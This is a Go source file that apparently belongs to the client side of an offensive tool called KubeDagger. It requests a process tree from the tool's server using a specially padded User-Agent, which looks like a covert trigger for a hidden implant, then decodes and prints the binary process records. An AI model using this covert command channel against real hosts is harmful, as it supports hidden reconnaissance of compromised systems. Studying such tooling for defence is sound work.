/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package proctree

import (
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"sort"
	"strings"

	"github.com/sirupsen/logrus"
)

type ProcessEntry struct {
	PID       uint32
	PPID      uint32
	Comm      string
	StartTime uint64
}

// FetchProcessTree retrieves the process tree from the KubeDagger server.
func FetchProcessTree(target string) ([]ProcessEntry, error) {
	ua := buildUserAgent("0012")
	client := &http.Client{}

	req, err := http.NewRequest("GET", target+"/get_proctree", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to contact server: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return parseProcessEntries(body), nil
}

// PrintTree displays the process tree in a hierarchical format.
func PrintTree(entries []ProcessEntry) {
	children := make(map[uint32][]ProcessEntry)
	for _, e := range entries {
		children[e.PPID] = append(children[e.PPID], e)
	}

	for ppid := range children {
		sort.Slice(children[ppid], func(i, j int) bool {
			return children[ppid][i].PID < children[ppid][j].PID
		})
	}

	roots := findRoots(entries, children)
	for _, root := range roots {
		printNode(root, children, "", true)
	}
}

func findRoots(entries []ProcessEntry, children map[uint32][]ProcessEntry) []ProcessEntry {
	pidSet := make(map[uint32]bool)
	for _, e := range entries {
		pidSet[e.PID] = true
	}

	var roots []ProcessEntry
	for _, e := range entries {
		if !pidSet[e.PPID] {
			roots = append(roots, e)
		}
	}

	if len(roots) == 0 && len(entries) > 0 {
		roots = append(roots, entries[0])
	}

	sort.Slice(roots, func(i, j int) bool {
		return roots[i].PID < roots[j].PID
	})
	return roots
}

func printNode(entry ProcessEntry, children map[uint32][]ProcessEntry, prefix string, isLast bool) {
	connector := "├── "
	if isLast {
		connector = "└── "
	}

	logrus.Infof("%s%s[%d] %s", prefix, connector, entry.PID, entry.Comm)

	childPrefix := prefix + "│   "
	if isLast {
		childPrefix = prefix + "    "
	}

	kids := children[entry.PID]
	for i, kid := range kids {
		printNode(kid, children, childPrefix, i == len(kids)-1)
	}
}

func parseProcessEntries(data []byte) []ProcessEntry {
	var entries []ProcessEntry
	entrySize := 32

	for offset := 0; offset+entrySize <= len(data); offset += entrySize {
		entry := data[offset : offset+entrySize]

		pid := binary.LittleEndian.Uint32(entry[0:4])
		ppid := binary.LittleEndian.Uint32(entry[4:8])
		startTime := binary.LittleEndian.Uint64(entry[8:16])
		comm := strings.TrimRight(string(entry[16:32]), "\x00")

		if pid == 0 && ppid == 0 {
			break
		}

		entries = append(entries, ProcessEntry{
			PID:       pid,
			PPID:      ppid,
			Comm:      comm,
			StartTime: startTime,
		})
	}

	return entries
}

func buildUserAgent(id string) string {
	ua := id
	padding := 500 - len(ua)
	if padding > 0 {
		ua += strings.Repeat("_", padding)
	}
	return ua
}
